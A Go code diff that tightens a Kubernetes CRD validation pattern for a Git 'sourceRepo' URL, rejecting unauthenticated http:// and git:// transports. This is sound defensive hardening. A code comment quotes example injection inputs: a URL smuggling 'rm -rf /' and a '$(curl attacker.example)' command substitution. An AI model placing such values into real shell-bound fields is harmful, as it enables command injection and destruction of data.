@@ -305,22 +305,28 @@ type CategoryOptions struct {
 	MeasurementTimeout string `json:"measurementTimeout,omitempty"`
 
 	// CRD admission is the sole validation gate for sourceRepo: the rendered
-	// value is spliced into a shell command in the catalog entry's clone step,
-	// so the Pattern below must keep rejecting inputs like
-	// "https://host/repo.git;rm -rf /" (shell metacharacters) and
-	// "$(curl attacker.example)" (command substitution).
+	// value is spliced into a shell command in the catalog entry's clone step
+	// and the cloned source is executed by the workload, so the Pattern below
+	// must keep rejecting inputs like
+	// "https://host/repo.git;rm -rf /" (shell metacharacters),
+	// "$(curl attacker.example)" (command substitution), and
+	// "git://host/repo.git" or "http://host/repo.git" (unauthenticated
+	// transports an on-path attacker can substitute code over, CWE-494).
 
 	// sourceRepo is the Git repository for the source checkout this category
 	// clones at pod start. Each catalog entry defines what its source is and
 	// its default upstream; point this at an internal mirror for air-gapped
 	// or restricted-egress clusters. Entries that clone no source ignore it.
-	// The URL must use a remote scheme (https://, http://, ssh://, or
-	// git://); scp-style git@host:path syntax and file:// are intentionally
-	// rejected: the contract is a remote git mirror, and local source belongs
-	// on the pre-seeded checkpoint PVC path instead.
+	// The URL must use an authenticated remote scheme (https:// or ssh://).
+	// http:// and git:// are intentionally rejected: the cloned source is
+	// executed by the workload, and those transports are unauthenticated.
+	// scp-style git@host:path syntax and file:// are intentionally rejected:
+	// the contract is a remote git mirror. Non-TLS mirrors and local source
+	// belong on the pre-seeded checkpoint PVC path or in the workload image
+	// instead.
 	// +optional
 	// +kubebuilder:validation:MaxLength=2048
-	// +kubebuilder:validation:Pattern=`^(https?|ssh|git)://[A-Za-z0-9._~:/@%+-]+$`
+	// +kubebuilder:validation:Pattern=`^(https|ssh)://[A-Za-z0-9._~:/@%+-]+$`
 	SourceRepo string `json:"sourceRepo,omitempty"`
 }
 
